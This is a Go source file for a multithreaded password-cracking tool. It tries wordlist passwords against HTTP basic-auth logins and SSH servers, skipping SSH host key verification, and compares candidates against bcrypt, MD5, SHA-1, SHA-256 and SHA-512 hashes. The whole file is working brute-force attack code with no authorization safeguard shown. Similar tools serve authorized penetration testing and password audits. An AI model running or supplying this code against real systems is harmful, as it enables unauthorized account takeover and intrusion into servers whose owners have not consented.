package cracker

import (
	"bufio"
	"context"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/hex"
	"fmt"
	"hash"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/crypto/ssh"
)

type AttackConfig struct {
	Target       string
	Username     string
	Wordlist     string
	MaxThreads   int
	Protocol     string
	Port         int
	Timeout      time.Duration
	ShowAttempts bool
}

type PasswordCracker struct {
	config     AttackConfig
	wordlist   []string
	stats      AttackStats
	cancelFunc context.CancelFunc
	mu         sync.Mutex
	attempts   int32 // Use atomic counter for thread safety
}

type AttackStats struct {
	Attempts  int
	Found     bool
	Password  string
	StartTime time.Time
	EndTime   time.Time
}

func New(config AttackConfig) *PasswordCracker {
	return &PasswordCracker{
		config: config,
		stats: AttackStats{
			StartTime: time.Now(),
		},
	}
}

func (pc *PasswordCracker) LoadWordlist() error {
	file, err := os.Open(pc.config.Wordlist)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password != "" {
			pc.wordlist = append(pc.wordlist, password)
		}
	}

	return scanner.Err()
}

func (pc *PasswordCracker) Start() (bool, string) {
	ctx, cancel := context.WithCancel(context.Background())
	pc.cancelFunc = cancel

	if len(pc.wordlist) == 0 {
		pc.stats.EndTime = time.Now()
		return false, ""
	}

	jobs := make(chan string, len(pc.wordlist))
	results := make(chan string, 1) // Only need capacity for 1 result

	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < pc.config.MaxThreads; i++ {
		wg.Add(1)
		go pc.worker(ctx, i, jobs, results, &wg)
	}

	// Send jobs
	go func() {
		defer close(jobs)
		for _, password := range pc.wordlist {
			select {
			case <-ctx.Done():
				return
			case jobs <- password:
			}
		}
	}()

	// Wait for completion
	go func() {
		wg.Wait()
		close(results)
	}()

	// Process results
	for result := range results {
		if result != "" {
			pc.stats.Found = true
			pc.stats.Password = result
			cancel() // Cancel context to stop all workers
			pc.stats.EndTime = time.Now()
			pc.stats.Attempts = int(pc.attempts)
			return true, result
		}
	}

	pc.stats.EndTime = time.Now()
	pc.stats.Attempts = int(pc.attempts)
	return false, ""
}

func (pc *PasswordCracker) worker(ctx context.Context, id int, jobs <-chan string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()

	for password := range jobs {
		select {
		case <-ctx.Done():
			return
		default:
			// Safely increment attempts counter
			attemptNum := atomic.AddInt32(&pc.attempts, 1)

			if pc.config.ShowAttempts {
				// Use log for thread-safe output
				log.Printf("[Thread %d] Attempt %d: %s\n", id, attemptNum, password)
			}

			success := false
			var err error

			switch pc.config.Protocol {
			case "http", "https":
				success = pc.testHTTP(password)
			case "ssh":
				success = pc.testSSH(password)
			case "hash":
				success = pc.testHash(password, pc.config.Target)
			default:
				log.Printf("Unsupported protocol: %s", pc.config.Protocol)
			}

			if err != nil {
				log.Printf("[Thread %d] Error testing password: %v", id, err)
			}

			if success {
				select {
				case results <- password:
					return
				case <-ctx.Done():
					return
				}
			}
		}
	}
}

func (pc *PasswordCracker) testHTTP(password string) bool {
	url := fmt.Sprintf("%s://%s:%d", pc.config.Protocol, pc.config.Target, pc.config.Port)

	client := &http.Client{
		Timeout: pc.config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	req.SetBasicAuth(pc.config.Username, password)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Consider any 2xx status as successful authentication
	return resp.StatusCode >= 200 && resp.StatusCode < 300
}

func (pc *PasswordCracker) testSSH(password string) bool {
	config := &ssh.ClientConfig{
		User: pc.config.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         pc.config.Timeout,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", pc.config.Target, pc.config.Port), config)
	if err != nil {
		return false
	}

	if client != nil {
		client.Close()
	}
	return true
}

func (pc *PasswordCracker) testHash(password, targetHash string) bool {
	// Check if it's a bcrypt hash first
	if strings.HasPrefix(targetHash, "$2a$") ||
		strings.HasPrefix(targetHash, "$2b$") ||
		strings.HasPrefix(targetHash, "$2y$") {
		err := bcrypt.CompareHashAndPassword([]byte(targetHash), []byte(password))
		return err == nil
	}

	// Try other hash algorithms
	hashTests := []struct {
		name string
		hash func() hash.Hash
	}{
		{"MD5", md5.New},
		{"SHA1", sha1.New},
		{"SHA256", sha256.New},
		{"SHA512", sha512.New},
	}

	for _, test := range hashTests {
		h := test.hash()
		h.Write([]byte(password))
		hashStr := hex.EncodeToString(h.Sum(nil))

		if hashStr == targetHash {
			return true
		}
	}

	return false
}

// Stop gracefully stops the password cracker
func (pc *PasswordCracker) Stop() {
	if pc.cancelFunc != nil {
		pc.cancelFunc()
	}
	pc.stats.EndTime = time.Now()
	pc.stats.Attempts = int(pc.attempts)
}

// GetStats returns current attack statistics
func (pc *PasswordCracker) GetStats() AttackStats {
	pc.mu.Lock()
	defer pc.mu.Unlock()

	stats := pc.stats
	stats.Attempts = int(pc.attempts)

	if !stats.EndTime.IsZero() {
		stats.EndTime = time.Now()
	}

	return stats
}
